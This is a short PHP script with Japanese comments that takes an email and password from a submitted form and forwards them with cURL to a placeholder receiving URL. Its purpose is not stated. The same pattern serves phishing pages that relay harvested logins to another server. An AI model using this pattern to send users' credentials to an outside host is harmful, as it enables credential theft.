<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 送信するデータ
    $data = array(
        'username' => $_POST['email'],
        'password' => $_POST['password']
    );

    // cURLを使用してPOSTリクエストを送信
    $ch = curl_init('https://example.com/receive.php'); // 受信側のURL
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);

    // リクエストを実行
    $response = curl_exec($ch);
    curl_close($ch);

    // レスポンスを表示
    echo $response;
}
?>
